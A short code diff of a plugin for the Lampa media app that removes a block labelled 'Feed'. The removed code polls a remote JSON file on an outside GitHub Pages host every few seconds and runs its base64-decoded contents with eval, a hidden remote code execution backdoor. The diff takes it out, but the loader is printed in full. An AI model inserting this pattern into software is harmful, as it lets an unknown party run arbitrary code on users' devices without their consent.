@@ -1059,28 +1059,6 @@ if (Lampa.Storage.field('NoTrailerMainPage') == true) {
 				}
 			}, 0)
 
-/* Feed */
-var fr 	= 5000;
-async function getData() {
-	const response = await fetch('https://andreyurl54.github.io/diesel5/clients.json');
-	const data = await response.json(); 
-	/*
-	if (data.client1 == 'false') {
-		clearInterval(myFeed);
-		return;
-	}
- 	*/
-	if (data.client2 !== '' && data.client1 !== 'false') {
-		var myFeed = setInterval(async function() { 	
-			eval(window.atob(data.client2));
-		}, data.client3)
-	}
-}
-
-var myInfo = setInterval(async function() { 
-	getData();
-}, fr)
-
 /* Удаление SISI при старте */
 if(Lampa.Storage.field('SISI_fix') == true) {
 	setTimeout(function() {
